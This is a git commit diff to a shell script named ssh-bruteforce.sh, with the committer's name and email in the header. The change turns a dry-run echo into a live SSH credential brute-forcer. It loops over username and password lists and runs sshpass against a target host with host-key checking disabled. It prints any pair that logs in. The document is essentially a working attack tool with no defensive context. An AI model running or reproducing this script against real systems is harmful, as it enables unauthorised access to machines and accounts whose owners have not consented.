c4d5642c9140c5c3c6a37f65912bab095bc15f4a
Moshe Rivkin <m0535541179@gmail.com>
2023-12-28 15:07:17 +0200

    add found case

--- ssh-bruteforce.sh
+++ ssh-bruteforce.sh
@@ -13,9 +13,12 @@ while IFS= read -r line
 do
     while IFS= read -r line2
     do
-        # sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
-        # just echo for now
-        echo "sshpass -p $line2 ssh -o StrictHostKeyChecking=no $line@$1"
+        sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
+        if [ $? -eq 0 ]; then
+            echo "found user: $line and password: $line2"
+            break
+        fi
+        # echo "sshpass -p $line2 ssh -o StrictHostKeyChecking=no $line@$1"
     done < "$passwords"
 done < "$users"
 
